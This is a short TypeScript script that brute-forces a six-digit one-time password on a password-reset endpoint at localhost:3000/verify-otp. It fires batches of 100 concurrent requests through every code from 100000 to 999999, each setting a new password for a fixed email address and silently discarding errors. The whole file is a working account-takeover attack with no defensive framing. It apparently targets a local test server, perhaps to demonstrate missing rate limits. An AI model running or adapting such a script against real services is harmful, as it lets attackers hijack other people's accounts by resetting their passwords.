import axios from "axios";


const sendRequest = async (otp: string) => {
  try {
    let data = JSON.stringify({
      email: "alim@gmail.com",
      otp: otp,
      newPassword: "34389483489",
    });

    let config = {
      method: "post",
      maxBodyLength: Infinity,
      url: "http://localhost:3000/verify-otp",
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };

    await axios.request(config);
  } catch (err: any) {}
};

const main = async () => {
  for (let i = 100000; i < 1000000; i += 100) {
    let p = [];
    for (let j = i; j < i + 100; j++) {
      p.push(sendRequest(j.toString()));
    }
    console.log(i);

    await Promise.all(p);
  }
};

main();
